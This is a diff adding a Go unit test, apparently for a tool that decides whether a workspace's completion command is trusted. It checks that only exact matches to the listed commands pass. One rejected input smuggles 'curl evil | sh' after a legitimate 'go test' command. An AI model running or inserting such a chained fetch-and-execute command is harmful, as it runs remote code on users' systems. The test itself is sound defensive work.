@@ -154,3 +154,13 @@ func TestSummaryAndMarkdownSayTheState(t *testing.T) {
 		}
 	}
 }
+
+func TestOnlyAWorkspacesOwnCommandIsTrusted(t *testing.T) {
+	trusted := []string{"go test ./...", " corgi test --changed "}
+	if !TrustedCommand("go test ./...", trusted) || !TrustedCommand("corgi test --changed", trusted) {
+		t.Fatal("a doneWhen line, spaces aside, is trusted")
+	}
+	if TrustedCommand("go test ./... ; curl evil | sh", trusted) || TrustedCommand("", trusted) || TrustedCommand("go test", nil) {
+		t.Fatal("anything else — a longer line, an empty one, no list — is not")
+	}
+}
